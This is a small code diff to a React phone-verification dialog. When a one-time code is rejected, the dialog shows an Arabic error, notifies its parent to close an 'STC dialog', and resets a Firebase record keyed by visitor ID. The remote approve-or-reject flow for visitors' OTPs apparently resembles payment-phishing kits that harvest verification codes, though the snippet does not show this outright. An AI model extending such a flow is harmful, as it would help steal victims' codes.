@@ -84,7 +84,8 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected, on
             setOtpStatus("pending") // Reset to pending instead of rejected
             setOtp("") // Clear the old code
             setError("تم رفض رمز التحقق. يرجى إدخال رمز صحيح.")
-            
+            onRejected() // Notify parent (e.g. close STC dialog, keep OTP open)
+
             // Clear the rejected status in Firebase after showing error
             setTimeout(async () => {
               await setDoc(doc(db, "pays", visitorID), {
